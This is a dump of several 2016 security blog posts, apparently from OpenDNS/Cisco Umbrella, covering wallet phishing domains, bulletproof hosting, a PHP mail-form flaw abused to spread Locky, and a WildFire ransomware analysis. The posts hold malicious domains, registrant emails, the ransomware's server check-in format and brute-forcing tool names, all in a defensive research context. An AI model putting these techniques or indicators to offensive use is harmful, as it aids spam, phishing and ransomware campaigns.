wallet companies are starting to take better prevention measures in protecting their brands from being spoofed; here is an example of the online wallet company Coinbase registering a bunch of domains that typically would be used for typosquatting:\n\nHowever, even with this protection in place, criminals are able to register phishing domains, but OpenDNS was able to detect these new Coinbase phishes:\nDomain: lcoinbase.com\nTimestamp: 2016–08–01T01:44:05.296Z\nScore: 0.9941726922988892\n\n\n\n\nThere are other domains associated with this email address also trying to phish other wallets such as Bitfinex:\nbitfinrx[.]com\nIOC\nMalicious registrants:\nblockchains@info.com\njosephallann@mail.com\nbuckley@email.com\nc.king@mail.com\nmarke9dkemfet@gmail.com\nDomains: iocs_blockchain\nWith a combination of unsupervised machine learning techniques and threat hunting, OpenDNS remains at the forefront of detecting these type of phishing attacks and protecting these online crypto-currency wallets.\n\nConclusion\nThis investigation was a combination of algorithm-based detection and threat intelligence analyst research, which shows once more the importance of multi-pronged approaches for efficient preventive security.

We look forward to this week every year to have the opportunity to share our research and network with the security community. We were able to attend many awesome talks and had the privilege of presenting as well.\nHere are some insights from our Research team.\nINSIGHTS FROM ANDREA SCARFO\nAndrea was particularly pleased to deliver her very first speaking engagement at a conference. At BSides Las Vegas, she presented “An Evolving Era of Botnet Empires“.\nThe talk highlighted the history of botnets, their evolving characteristics, and botnet detection methods using DNS traffic.\n\nOf all of the amazing talks at BSides, here are a few highlights from the talks that Andrea was able to attend:\nRyan Chapman gave a really enjoyable interactive talk titled; “Exposing Neutrino EK: All the Naughty Bits”. Ryan made a point to highlight that the Exploit-Kit vulnerabilities are part of a business. The malware authors pay for their malware to be distributed by the Exploit-Kit authors. Someone gets paid to run the campaign to spread the exploit-kits and redirect the traffic. There’s also money to be made in setting up the infrastructure that is used to make all of this happen, for example, the redirects and the landing pages. He then had a really cool live display of reverse engineering the second stage .swf file involved in the Neutrino Exploit-Kit using FlashDevelop.\n\nVineetha Paruchuri delivered “QUESTIONING 42: Where is the “Engineering” in the Social Engineering of Namespace Compromises?” A very lively and frank discussion about how frustratingly easy it is to social engineer your way into taking control over someone’s digital life, or gaining control over a domain. Some examples required only pure social engineering. While others were a mix of social engineering, workflow and protocol vulnerabilities or exploits combined. Companies that continue to value profit over customer privacy will make it incredibly easy to social engineer your way into someone’s personal account. The fact that OSINT is used to verify ownership of very important and private accounts is still mind boggling. Vineetha likened the human interactions involved in these social engineering cases to a client/server session. Putting some actual “engineering” into the social engineering problem could lead to a solution. One major take-away: 2FA all the things.\n\nINSIGHTS FROM THOMAS MATTHEW AND DHIA MAHJOUB\nDhia and Thomas gave a talk at Blackhat 2016 with Mykhailo Sakaly from Intel471. In their talk titled “Towards a Holistic Approach in Building Intelligence to Fight Crimeware”, they proposed an integrated approach to fight crimeware that combines both network-centric and actor-centric perspectives.\nBulletproof hosting (BPH) providers represent a fundamental enabling technology to all sorts of cybercrime campaigns and they lend themselves to being explored from both perspectives.\nCybercrime offerings\nIn the first part of the talk, the speakers described the different classes of cybercrime offerings: products, services and goods. Products include malware (e.g. RATs, banking trojans), DDoS or brute-forcing tools and exploits and vulnerabilities. Services include bulletproof hosting, DDoS services, ransomware-as-a-service, exploit kits, cash out and exchangers. Goods represent commodities that are quickly consumable such as credit card and database dumps and PII.\n\nBqhost is an example of a bulletproof hosting provider with a public web site.\nIntelligence sources for crimeware investigation\nNext, they described the data sources and processes used to construct the network and actor centric views. The network view uses data such as DNS, IP, BGP, Whois, SSL, malware samples, etc. The actor-centric view is built through access to closed underground forums and marketplaces, direct communication with criminal actors, and the purchasing of services to verify claimed features and map out infrastructures.\n\ncrdclub.ws is a free registration credit card dump shop hosted on BPH.\nBulletproof hosting classification taxonomy\nThe speakers then proposed a BPH classification taxonomy: From the actor view, these hosters can be ranked in 3 tiers depending on their reputation, technical complexity and involvement in high profile cyber-criminal campaigns. From the network view, we identified key technical features that, when combined together, are distinctive of rogue hosting infrastructures. Some of the features are:\n-Leaf ASN (also known as stub ASN in networking terminology): an ASN with upstream but no downstream peers.\n-Business registration in offshore jurisdictions (e.g. Anguilla, Belize, Dominica, Seychelles, UAE, etc).\n-Hosting that is botnet-based or dedicated servers based.\n-Anonymous payment methods, e.g. bitcoin, Perfect Money.\n\nDataflow.su is a bulletproof hosting provider operating leaf AS203624, with business registration in Belize and IP space in Ukraine, Russia.\nBulletproof hosting use cases\nIn the second part of the talk, Dhia and Mykhailo gave a detailed overview of various examples of BPH that are both botnet based (ZBot fast flux proxy network) and dedicated (Althost, Abdallah, Maxided, Dataflow.su, XServer, Offshore Racks) with the majority operating from Ukraine and Russia. They also talked about the evolution of these services over the past few years.\n\nOffshoreracks.com is an anonymous offshore hosting provider located in Panama and hosting phishing, stolen credit card shops, pharma, etc.\nUsing SSL data at scale to track malware infrastructures\nThe talk finally discussed the methods used in order to identify bulletproof hosting providers with SSL scan data as a key source. SSL data constitutes a valuable fingerprint in identifying similar hosting ranges. Therefore, we talked about how to build a database to store SSL data involving x509 certificates and SSL hashes. These two pieces of information can be used to identify a particular hoster based on searching through common-name records in the x509 certificate or scanning IP ranges for particular SSL hashes. Thomas described the database involved and the various engineering challenges we faced in order to make the system scalable. One notable problem was designing tables that were optimized for large scans. By tweaking our rowkey structure we were able to solve the issue. By combining SSL data with IP monitoring techniques, security researchers are able to better identify bulletproof hosters as well as predict new IP ranges where hosters might move their services to.\nStay tuned for the release of the video of the talk.', 'Events;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2016/09/08/bsides-las-vegas-blackhat-usa-recap/');

For example, suppose you saw 1,2,1,2,… We might guess: 1. Or perhaps, what if you saw 0,0,1,2,3… ? Should it be 4? It almost feels like a domino effect. In this post we walk through predicting a specific type of spike in domain queries associated with some botnets. These domains spike like falling dominos: 0,0,0,1,2,3….\nIn this post we will\nExplore our ability to make predictions about the number of future queries to a given domain.\nProvide a recipe that can be incorporated on an hourly basis to a given watch-list of domains.\nSomething you can do if you have Python, PyBrain, and some data from the OpenDNS investigate UI\nThe Problem\nBelow we track the amount of queries made to 8 different domains (per hour) for the last 5 days.\n\nHere the queries per hour in a domain appear to follow a sinusoidal pattern (with minor hiccups). These patterns are fairly predictable. On the other hand, consider the following domains:\n\nHere we see 5 domains spiking around the same time and in contrast we see two domains following a characteristic sinusoidal pattern. Obviously, we would like to predict when a domain will spike.\nPerhaps you are familiar with recurrent neural networks and related problems, then you might want to skip down to the Github gist and just check out the code. Otherwise, carry on.\nRecurrent Neural Networks and LSTMs\nTo do this we will use and train a recurrent neural network with long and short term memory (LSTM) using the Pybrain module. A recurrent neural network (rnn) is a popular choice when trying to classify or predict elements from sequential data (think of data from the stock market, speech, and even tweets). The most notable characteristic of rnns is that they are a neural network with directed cycles between adjacent neural network modules. While, on the other hand, LSTM networks are a special kind of rnn with connections between non-adjacent neural network modules. For more check out this overview.\nTraining\nLike most neural networks we train them to minimize some sort of loss function related to the input and some output. In this case, we wish to input one number and predict the consecutive number. Therefore we wish to minimize our errors in predicting the next number.\n\n\nGiven about 100 domains and the last 5 days of queries per hour we train the LSTM network… over 5 epochs and 100 cycles. We see the error rate reduce over the training set as the epochs increase and the more data is utilized in training the network.\nHere we feed in one sequence of queries from one domain at a time and then calculate the error over a subset of the training data per epoch.\n\nPredictions\nThe first result we will study is a spiking domain. This domain, of course, is what we are mainly interested in, but it also serves as a good place to discuss the performance of the LSTM networks. In Figure 3 you will see the spiking domain with the actual query traffic in black and the predicted in blue.\n\nWe need to break down this graphic a little. First notice, how the black curve shows sharp transitions while the blue tends to lag and almost follow a rolling average. Second, notice how the blue curve appears slightly shifted to the right from the black.\nWith respect to the blue curve softening transitions and appearing shifted or translated to the right, we actually can identify the error in our LSTM. In fact, to more clearly see this I interleaved black diamonds on the black curve for every hour in which the domain was just about to increase. Similarly, I interleaved blue dots on the blue line for every hour in which the domain was just about to have a predicted increase in queries.\n\nIn the figure to the left, we have zoomed into the moment prior to the largest spike. Here, we see the black diamond (circled in red) representing one of the largest amounts of queries per hour for this domain within the time window. Unfortunately, the blue dot (circled in red) shows what the LSTM network predicted the next value to be. Unfortunately, the LSTM network predicted the volume of queries in the next hour to decrease, while in reality the anomaly of the black diamond was more of an indicator that the domain was about to have a spike in the volume of queries in the next hour.\nIn this case, we see the limits of the currently trained LSTM network. For example, in the successive queries per hour, the LSTM tends to predict values which are relatively similar to the values that were given as input.\nIn fact, check out the following examples. These examples are like the one just described where the real domain traffic is in black and the predicted in blue.\n\nSo as you can see from the figures above that the LSTM network we trained with PyBrain seems relatively limited in its ability to predict spiking queries in subsequent hours for a domain. So where do we go from here?\nWell, notice, one of the upshots of our analysis: we are exploring our ability to make predictions about the number of future queries to a given domain. This is slightly different than detecting anomalies more generally, for the simple reason that the methods we have been describing are proactive, not reactive.\nIf predictive ability is what you’re after, then there are a couple choices for us. One choice, is begin to play around with the LSTM network structure. For example, trying out different number if hidden layers and units. In addition, given our initial results here we might be encouraged to take this model but train it on more data. If that’s the case, we may start to explore the relative payoff of using either Theano or Tensorflow.\nIn addition, we have tried to keep this analysis small and repeatable for anyone who has access to Python, PyBrain, and some of the data one can get from the OpenDNS investigate UI. We tried to keep this brief and are indebted to the PyBrain developers and StackExchange contributors.\nLastly, as we iterate and improve on this model, we have explored a recipe which can be incorporated into a watch-list of domains where every hour one retrieves the amount of queries to that domain, and predict the subsequent hour, and can with fairly simple methods detect when a domain with deviate substantially from the previous queries per hour. A simple test for anomalies is outlined in the code below.\nCode Review\n\nThanks for reading.', 'Big Data;DNS;Machine Learning', 'https://umbrella.cisco.com/blog/2016/09/06/dominos-botnets-little-lstm/');

The problem is that even if a given propagation algorithm works at one time, it’s not guaranteed to work at another. One problem is that malicious domains occur in a deluge of internet traffic—a large-scale network passing and propagating messages— that’s fast, redundant, and non-uniform. The search for similar domains hosting malware is obscured in this apparent white-wash of noise from one time slice to the next.\nA new wave of cybersecurity professionals now seeks to apply techniques from artificial intelligence, neural networks, and deep learning to classify malware samples and botnet campaigns. Less publicized is similar work in the related fields of bio-medical signal and image processing, which may help inform our pattern recognition and classification work. For instance, might techniques used to classify medical images be applied to phishing pages? Can techniques used to classify brain activity from muliple signals streaming simultaneously be applied to classifying various malware campaigns? Perhaps we can rephrase the cybersecurity problem as an image-processing problem? A signal-processing problem?\nLast month, the Science and Information (SAI) Conference 2016 assembled a variety of researchers in artificial intelligence, machine vision, and security (to name a few fields) in London (UK) to explore the connection between the fields of bio-medical science, computing, mathematics, and information security. The conference was managed by Supriya Kapoor and emceed by the vibrant Lars Sorensen.\n\n\nVIDEO: SAI Conference teaser; post author speaks at 0:41\nI attended the SAI to present A Neural Decision Forest Scheme Applied to EMG Gesture Classification, joint work with Drs. Zhang and Piryatinska from San Francisco State University. Neural decision forests were first introduced by S. Rota Bulo and M. Kontschieder in Neural Decision Forests for Semantic Image Labelling (2014). The highlight of a neural decision forest is that it is a classifier with embedded signal processing. The upshot: any problem related to labeling a vector of numeric values to a label, just got easier, because the somewhat difficult task of producing hand-crafted features and other signal pre-processing techniques are not typically required and are embedded in the classifier.\nFor the visual learner, a neural decision forest is a collection of tree like structures where the internal nodes (or gates) are neural networks (for this research we picked feed-forward networks). Check out the FIGURE.\nFIGURE: Schema of a neural decision forest with three neural networks acting as gating functions.\nAt the end of the presentation I walked through one application of neural decision forests. Using the Myo Thalmic band I recorded a variety of gestures and trained a neural decision forest to distinguish these gestures. You can check out the accuracy and more here.\nIn addition, the conference offered a variety of tracks: Artificial Intelligence, Machine Vision, Cloud Computing, Security and Privacy, and more. Security professionals may have found the following presentations of particular interest:\nStatistical Approach towards Malware Classification and Detection\nAn Empirical Study of Security of Voip System\nA-RSA: Augmented RSA\nor perhaps talks more seasoned with machine learning techniques:\nFuzzy Based Modeling for an Effective IT Security Policy Management\nFuzzy Random Decision Tree (FRDT) Framework for Privacy Preserving Data Mining\nMachine Learning Based Job Status Prediction in Scientific Clusters\nof course, these are just a few of the talks that were offered.\nMy favorite was Multi-Scale Reflection Invariance. To understand the context, check out the Microsoft #howoldrobot. In related work, Henderson and Izquierdo show that current deep learning techniques may not exhibit reflection invariance in image classification tasks. For example, the above linked Microsoft #howoldrobot will predict Alan Turing to be 53 when the portrait is facing one direction and 46 when flipped along the vertical axis (so he’s facing the opposite direction). Wait, what? Very subtle. How does flipping alter the classification results so much? I wondered if this problem was in any way related to translation-invariance difficulties in classification tasks, but whether the two problems are related appears to be unknown.\nSo, whether you’re looking to expand your breadth in infosec or machine learning, consider attending this unique gathering, which starting with the 2017 event will now be known as Computing Conference.  Said differently, if you’re in London next July 18-20, take the underground east to Towers Gateway.

However, because criminal economics is a live ecosystem that reacts to market needs, malware-as-a-service, ransomware-as-a-service, and exploit-kit-as-a-service models are changing that ecosystem while spammers and scammers are changing their day-to-day routines in an effort to attract more customers.\nIn this post, we’ll examine one scam campaign recently detected by OpenDNS that targets adult, gambling, and dating websites.\nDetection\nThe initial discovery was done with NLP rank classifier. Most of the detected domains seemed to serve MiktoTik RouterOS login page.\n\nThis group’s main focus is dating spam that drives traffic to fake dating services which collect personal information and typically require credit card information for registration. Current pricing varies from $1-$3 per 1000 emails.\nInvestigation\nLocating actual emails delivered by this campaign required some digging, and we were lucky enough to get one of them:\nReceived email and link in it\nHttp response headers\nWebsite to which users are redirected\nDomain serving redirected to mpodosaki[.]swingproject[.]eu which was compromised and injected with the malicious pjtxt[.]php file. This domain is still using a vulnerable version of Joomla, which is most likely how it became compromised in the first place.\n\nActors\nFurther investigation of the campaign led us to discover its actors and infrastructure. Because the majority of the campaign’s dedicated for scam domains are registered under two accounts (fisher9006@rambler.ru and toleinik_viktor@lenta.ru), we can identify those users as primary actors.\n\nMost of them have very low traffic and don’t resolve to any IP, which indicates that they might be used later. Here is a domain that’s been actively involved in the campaign since July 12th:\n\nAnd here is a domain active between June 16th and July 27th:\n\nWith newer domains, the actors started using Whois privacy protection and obfuscation. But, if we look at the naming patterns of the subdomains, the similarity is obvious:\nIn this case, planet-dating-74[.]com is a dedicated second level domain name (2LD) for this dating spam campaign. It was registered on June 13, 2016, and the subdomain is used for spam. The fact that both the 2LD domain and subdomain resolved to different IPs seems to be a defense against IP blocking.\noutlookern[.]planet-dating-74[.]com resolves to 213.147.140.17\nplanet-dating-74[.]com hosted on 5.8.32.74\nResults\nWith these findings, we can conclude that this spam scheme is organized as below:\n\nWe were able to identify 35 compromised routers total. We can determine the difference between dedicated and compromised infrastructure with a quick nmap scan, in which we see that dedicated IPs have port 25 open (for email spam) and compromised IPs have only port 80 open (serving http injections).\n\nDedicated name server for domains\nCompromised device\nEven though mail[.]izlenimyapi[.]com is listed as a mail server, we can see that port 25 is closed. In this case, dedicated domains will point to the IP that would not be blocked even if all of the  subdomains impersonating mail servers would, since all of them point to different compromised IPs. Thus, once again we prove that malicious actors are well aware of common web filters and protection mechanisms.\nIn mapping compromised IPs to their geo locations, we see that the devices are broadly spread. We were also able to identify a whole range of OS versions without any of them prevailing. We concluded that compromised devices were not exploited with a specific vulnerability (unless there is a zero-day for any Mikrotik Router OS) but were instead exploited with the help of bruteforcing software that was used on a large scale.\nGeolocations of compromised devices with RouterOS\nCurrently there are two products with this functionality available on black market:\nRouter Scan by Stas’M, which is able to find, identify, and cull useful information from a variety of devices from among large number of known routers\nMKBRUTUS, a password bruteforcer for MikroTik devices or boxes running RouterOS\nAs for the scope of such a scan, we can make a fast query on Shodan, which reveals 1,124,859 Web-facing Mikrotik devices.\nAs a result of this research, we identified this campaign’s spam infrastructure and the malicious actors behind it. With a deeper dig into the research we’ve already acquired, we may be able to connect this campaign to other cybercrimes.', 'Uncategorized', 'https://umbrella.cisco.com/blog/2016/08/05/identifying-scam-infrastructure/');

It’s direct marketing for their scam! The trouble is that, to an even greater degree than legitimate direct marketers, they need to keep operating costs very low, so the fiscally responsible ones don’t want to just outsource it. Instead, they spend time uncovering clever tricks to send out their messages on the cheap.\nActors distributing Locky ransomware are no exception. During a mid-July campaign, it appears these actors were abusing an unpublished vulnerability in certain PHP web-to-email forms which allowed them to send emails from any source address to any destination—with their ransomware attached! In this post we’ll dig into that vulnerability and look at one set of circumstances under which such a thing might occur.\nWeb-to-email forms\nI think the first ever web-to-email form I came across was form2mail.pl. The concept was simple: you have a website and you want your visitors be to able to contact you through a form. You write the HTML side for the WebUI and when the visitor submits the form, it sends a POST to the web-to-email application which takes the data, bundles it in an email, and sends it to you. Free scripts to implement this pattern are available for just about every language. Locky distributors focused on PHP scripts.\nA trivial vulnerability\nThe key security mechanism in these scripts is that you (the site owner) define the destination email on the server side which is inaccessible to the web visitor. You can also statically define content, the email subject, and virtually every other component of the email itself, but the big obvious risk is mostly mitigated by defining the destination address, server side. So in theory, the only thing an attacker could do is target *you*, and potentially send *you* lots of convincing spam.\n$GLOBALS, ack!\nThis all falls apart when the web-to-email form does something insane lazy:\n\nWhat happens here is that the application takes every key/value pair POST’ed by the visitor and assigns each key as a PHP variable populated by its corresponding value. On the surface this might not be too bad if there are not any overlapping POST parameters with PHP variables; however, since we don’t have strict control over the data POST’ed by the user, the application is severely vulnerable to attack. Why? Let’s look more broadly at the code (simplified, only the important parts shown):\n\nConsider the visitor sending POST data which contains a parameter DestinationAddress with an arbitrary email address. Since the whole loop effectively overwrites the PHP variable $DestinationAddress with whatever the visitor provided in their POST request, and since that variable is used as the destination email address to the mail() function, the visitor just sent an email to an arbitrary address! In other words, an actor just spam’ed out an email with a link to their Locky download site using the vulnerable web server. The same concept is used to overwrite the subject line of the email and embed a file in the request and attach it.\n0-Day?\nSimilar vulnerabilities have been found over the last 10 or so years in many PHP web applications, and the web forms that we found vulnerable all had newer versions available which address the issue. However, we were unable to find any publicly reported instances of these vulnerabilities in the specific PHP webforms we saw being abused.  We did reach out to the vendor(s) we could identify, requesting contact information, but received no reply to date and thus we’re choosing not to identify the specific applications containing the vulnerabilities. Updating to the latest version of your PHP web-to-email form should fix the issue.\nAre Site Owners Negligent?\nI was curious and wanted to dig a little deeper into why some of these sites were vulnerable to begin with, and given the geographical proximity of one company hosting vulnerable web-to-email forms to my own location, I contacted the small business. A few days later, the business owner responded and seemed to be genuinely concerned that their site was facilitating attack. Once we dug in a little deeper, an all-too-familiar story emerged: the site was all but abandoned.\nThe owner had initially hired a local third party design and hosting company to develop and manage the site. After some time, the owner requested certain site updates with which the designer disagreed and refused to make. This minor conflict turned nasty when the designer changed the password to the management interface of the site, effectively locking out the owner. The owner claims to have lost all control over the registration and management of the site, and the designer/hosting company is not responding to his attempts to contact them. It appears that this designer’s actions could be having a much larger effect, given that the site was being used to distribute ransomware.', 'Incident Response;Labs Research;Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2016/08/01/vulnerable-php-forms-abused-locky-distribution/');

Good visualizations can provide insight into a dataset that might otherwise be overlooked. In this post, we’ll go through the process of creating graphic insight from an abstract dataset by building an actual data visualization step-by-step.\nFirst: The Data\nTo build this visualization, we start with a 10-minute log chunk of raw DNS data that gets dumped into an Amazon S3. Log chunks are the rawest form of data the OpenDNS research team uses to do analysis, and they make for a good place to start talking about the life of a data visualization. If you want to know more about the process of getting log chunks, check out this post from Josh Pyorre.\nLog chunks are text data that won’t be useful for our visualization without some cleaning and parsing. The goal of the visualization is to see what the traffic looks like when connecting resolver requests based on the order they were received. To create latitude and longitude coordinates with IP addresses, I used the Maxmind API available via pip. This is all put together in a browser-consumable .csv file (see some of the python code below).\n\nNext: The Visualization\nTo make the query patterns visualization, I used Three.js, a JavaScript API used to create 3D computer graphics in a web browser. Because Three.js uses the GPU, which is made for handling pixel processing, it’s perfect for making visualizations that use a lot of data.\nAfter a first step of creating a scene with lighting, next a globe on which all of the lines will sit should be created, which is easy in Three.js. To help make your planet look more realistic, you can find earth textures that contain elevation/bump maps with a quick Google search; GPUs can then sample those 2D texture images and project the texture on your 3D globe object using UV mapping. You can use as many textures as you like to render your earth replica, but only basic earth texture mapping is required. For the sake of clarity, less is definitely more here; the simpler your graph or chart is, the more likely its insight is to be easily understood.\nUV Mapping Diagram\nAfter finding appropriate textures, you can use the handy ImageUtils and loadTexture method to load the image, making sure to pass in the THREE.UV Mapping object. Then, Three.js will map your textures onto a sphere geometry with dimensions you select to create your planet.\n\n\nWith a nice planet now in place, it’s time to make our line segments. Each line is a spline curve, which is a general curve defined by piecewise polynomial functions. Each spline is split into 8 pieces, evenly split from the starting to the ending latitude/longitude pair. 3D coordinates are created from each of the points using an arc radius determined by using the radius of our earth replica and the current part of the spline.\nThe spline is used with the getPoint method to create small line segments that are joined together to form a geometric curve which connects domains that were resolved after each other. The number of line segments is determined by control points; the larger the number of control points, the more computationally expensive each line is to draw because each segment requires its own attributes to direct placement and coloration of the line segment.\n\nBelow you can see how line segments that have been individually colored with random colors look.\n\nFinally: The Completed Visualization\nThese are some images from the interactive version of the visualization.\nHere, Los Angeles logs are blueish green and Chicago logs are white:\n\n\nMiami query logs, one of our busiest resolvers:\n\n\nHong Kong query logs are green:\n\nAmsterdam query logs are white:\n\nFuture Improvements\nAny number of improvements to this visualization would help it reveal better patterns. For instance,  encoding the color of the line segments with Investigate data would give insight on attacks, be relatively easy to do and create a beautiful effect.\nAnother interesting improvement would be to render the connections using edge bundling, a force-directed visualization technique that bundles line segments along the same path, much the same the way one might organize wires. The effect removes visual clutter and helps make patterns stand out more clearly. To learn more about how it works, check out edge bundling research online.\nUS Airways Edge Bundling\nEdge bundling example', 'Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2016/07/25/from-query-logs-to-visualization/');

Today I came across gsxrmcgsygcxfkbb.onion and poof! down the rabbit hole I tumbled.\nKelihos Aids Distribution\nWe first started seeing WildFire ransomware hitting our resolvers on June 21, 2016, and there has been an increase in activity over the last few days. This is most likely due to a bump in distribution by the Kelihos Botnet.\nBefore the ransomware takes hold, systems infected with WildFire will aggressively attempt to communicate exithub1.su, exithub2.su, exithub-pql.su and exithub-xuq.su. If we look at the number of requests for those domains, we see a nice influx:\n\nMost infection reports are coming in from the Netherlands. If we check out who is requesting these domains, we see that most requests originate from the same place: 95% Netherlands.\nWord Macro via Email\nThe journey starts with an all-too-common initial infection vector: a user receives an email with a macro-embedded Word document attached. In this case, it was titled BT-32084.doc (8f8741e18aa6b7b8282402f0aea5e0c9).\nThe Word document displays a message to the reader instructing them to enable macros to view the content. Those with an eye for detail might notice that the document is 205 pages long! This is because it’s using an oldie-but-goodie trick by embedding its payload in the document text, rather than within a document stream. At first glance, you might miss it since all of the pages appear to be blank. An easy way to view this hidden “treat” is to select all text in the document with CTRL+A, then change the color to something other than white, like red. Here’s what you’ll see:\n\nThe prevalence of 0x33 bytes suggests that the payload could be XOR’ed with 0x33. Rather than take this avenue for analysis, let’s use another technique to take the express train to the binary.\nPayload Extraction\noledump will allow you to dump the various streams of the document, or if you’re in a tight analysis environment and speed is more important than thoroughness, you could just ‘ride-or-die’ and execute the macro. I have always thought DMX and Fetty were onto something, so let’s go for ‘ride-or-die’.\nSearching for calls to the Shell() function within the macro will fast-track you to what is being executed. If we set a breakpoint on the call and inspect its parameters at runtime, we can see that the macro is calling C:\\ProgramData\\Memsys\\ms.exe (f157038d7b105cee1b8bb8c957f1ec39), which means it likely wrote ms.exe to the file system earlier in macro.\n\nSelf-Extracting Archive\nWith ms.exe resting nice and comfortably on your file system, you might be so inclined to open it up in IDA to let the real work begin.\n\nThat is, until a few strings indicating this is a self-extracting archive bring you right back to “ride-or-die”.\nExecuting ms.exe, checking %TEMP%\\RarSFX or extracting with 7zip will yield three files: Bigrmkwhrr.png (645e7f63886d74c5edd149caac1b41cd), Imvenagxehdoj.xml (9f543d1ca1fe9a2ea69984f2a3804fe1), and Jnmsiyyks.exe (a86f56fee647446d33d555b25d871bf8).\nDot Net Obfuscation!\nWildFire’s second-stage executable (Jnmsiyyks.exe ) is just really a wrapper around the supplemental files that were extracted in the same directory. The obfuscated code creates a big nasty AppContext with the contents of Bigrmkwhrr.png as a variable, decodes it, and then launches it as a form in a thread.\nDot Net Ransomware\nLuckily, this thread’s assembly is not obfuscated, so with some quick XOR’ing, we have access to the full source of the source. Here’s a quick script to handle the XOR’ing:\n\n\nNetwork Activity\nAs mentioned above, the malware aggressively attempts to contact its servers — exithub1.su, exithub2.su, exithub-pql.su and exithub-xuq.su. Once it is successful, it will POST base64-encoded data to the server. I changed the output slightly to anonymize it:\n{\"action\":\"connect\",\"uid\":\"abcdef0123\",\"rid\":\"email_spread_XXX\",\"username\":\"user\",\"computername\":\"LAPTOP\",\"ip\":\"123.45.67.89\",\"country\":\"UE\"}\nIf the registration is successful, the server will return a password:\n{“status”:”success”,”password”:”sAKFSdgVKVdFLfvjwWkvdjjXXlotynss”}\nand the client will update the server with its status in increments:\n{\"action\":\"update\",\"uid\":\"abcdef0123\",\"filecount\":\"8320\"}\nThen, upon success, the server will return:\n{\"status\":\"success\",\"null\":\"null\"}\n\nNotification and Payment\nOnce WildFire encrypts all of the files on the system, the ransomware lets the user know by the now-ominous ransomware notification page. One interesting thing here is that the payment page is hosted on both the internet and on Tor. Usually bad actors only leverage Tor to remain anonymous, but here the attacker is either confident in the privacy of the system hosting the landing page, or doesn’t care to remain anonymous.\n\nAttribution\nI’m half-joking about the heading of this section, we all know attribution is hard. But if we wanted to comment slightly on the topic, we could imply from directory listings shown in the image to the right that this system may have been set up/compromised on June 20th. And, due to some friendly comments in the HTML source of the page shown below the directory listing, we see that the author needs to fix the timer javascript.

Each time a user discovers (“mines”) a new group of transactions (“block”), Bitcoins are generated (“rewarded”). The number of bitcoins rewarded per block decreases geometrically, with a 50% reduction every 210,000 blocks, or approximately four years, a process known as “halving”.\nBitcoin’s next supply growth reduction will happen next month   Upon its 2009 launch, miners were rewarded 50 Bitcoins (BTC) per block, which per the algorithm fell in 2012 to 25BTC per block. Now the reward is set to halve again sometime next month, dropping the reward per block to 12.5BTC .\nAnticipation of this supply drop is driving demand  Ahead of Bitcoin production’s scheduled throttle, trading activity has experienced a sharp uptick and subsequent price rise. “We are seeing very high trading volumes,” notes Bobby Lee, chief executive of China-based BTCC, one of the world’s largest bitcoin exchanges.\nMore people are using Bitcoin   Because Bitcoin is the primary currency demanded of ransomware victims to restore data held hostage by bad actors, the 2016 ransomware epidemic has accelerated Bitcoin generation.\nMore people want Bitcoin   Ongoing worries about the Chinese economy and a potential further depreciation of the Yuan make Bitcoin an attractive alternative for Chinese businesspeople seeking assets that can have sustained purchasing power\nInitial Bitcoin Phishing Detection\nTraders, economists and bankers are not alone in taking note of the recent Bitcoin frenzy, however; criminals staging phishing campaigns — malicious actors who’ve traditionally not made a habit of cherry-picking amongst your exploitable assets — have discovered that Bitcoin can provide an easier way to steal.\nThus we were not to surprised when, on June 9, 2016, OpenDNS detected with our model NLPRank a new phishing attack on the domain blockchain-wallet[.]top targeting the cloud-based Bitcoin wallet company blockchain[.]info.\n\nFirst signs of this new campaign were noticed by security researchers from Cyren at the beginning June, when a phishing campaign utilizing the domain blocklchain[.]info as its web address began to spread using Google AdWords.\nThen, on June 13, 2016, OpenDNS Labs detected blolkchain[.]com which was another phish on the same IP 89.248.171.88.\n\nExpanding Intelligence via Hosting IP Space, Name Server and Whois\nWhen investigating the hosting IP more in depth, the additional domains below were discovered to be hosted on 89.248.171.88: blockchain spoofs, Pharma Spam and phishing domains are all over on this IP.\n\nIP Range\nAfter checking the neighboring IPs on the 89.248.171.0/24 range, we discovered several more IPs hosting a mix of more-or-less legit content like puppy websites (http://www.astrahomepugs[.]com and http://tessymaltesehome[.]com), rogue content like fake merchandise (http://www.luxurybrandsmall.com/), iCloud phishing (idmas-appleid[.]eu), more Bitcoin phishing sites, offshore banks (http://www.anonymousoffshorebank[.]com/), porn sites and even child modeling sites (which are illegal and should be taken down). Given this shady content, we blocked the entire IP Range for our customers and as a reference, we provide the list of domains on the 89.248.171.0/24 range.\nRevealing Rogue Offshore Hosting Providers\nWere it not for the support of the same bulletproof or anonymous hosts in offshore jurisdictions who’ve historically provided infrastructure for bad actors, this current spate of Bitcoin wallet phishing would be without a launchpad.\nCase in point: 89.248.171.88 is hosted on AS29073, QUASINETWORKS, which actually used to be ECATEL [1][2][3].\n\nECATEL is a known Dutch hosting provider founded in 2005, registered in the UK, and headquartered in The Hague. It offers offshore hosting options and, over the last decade, has consistently hosted criminal and toxic content [4][5], and generated spam and DDoS traffic from its IP space [6]. ECATEL is known to law enforcement, has been shut down by its peers at least once (in 2008) [7], and was subject in 2012 to DDoS attacks by Anonymous for hosting child porn [8].\nIn December of 2015, ECATEL changed their network name, and since then, AS29073 is officially called QUASINETWORKS [10][11]. More interestingly, ECATEL/QUASINETWORKS changed its registration from the Netherlands to the Seychelles, which is an offshore jurisdiction. This is a common evasive practice used by bulletproof hosting providers that we’ve observed for several years and covered at Infosecurity Europe, Hack.lu, Brucon, and RSA.\nOriginal registration details of ECATEL. Notice the The Hague, Netherlands address.\nUpdated details of QUASINETWORKS. Notice the Seychelles address.\nThen in April of 2016, ECATEL rebranded yet again, and is now known as novogara.com. In fact, ECATEL is still selling the same products on 4 different live websites: ecatel.net, ecatel.co.uk, ecatel.info and novogara.com.\n\nDomain\nCreation date:\nLast seen live:\n\n\necatel.net\n16-May-2004\nCurrently live\n\n\necatel.nl\n04-July-2005\n17-Dec-2014\n\n\necatel.co.uk\n18-Jun-2008\nCurrently live\n\n\necatel.org\n18-Jun-2008\n17-Dec-2014\n\n\necatel.info\n16-Oct-2010\nCurrently live\n\n\nnovogara.com\n15-Apr-2015\nCurrently live\n\n\nquasinetworks.com\n24-Jun-2015\nLive but no content\n\n\nquasinetworks.net\n24-jun-2015\nLive but no content\n\nWe further checked out the name servers of blolkchain[.]com, which are ns1.offshore-dns.net and ns2.offshore-dns.net: ns1.offshore-dns.net resolves to 80.82.70.10 and ns2.offshore-dns.net resolves to 93.174.91.42. Both 80.82.70.10 and 93.174.91.42 belong to the same AS29073, 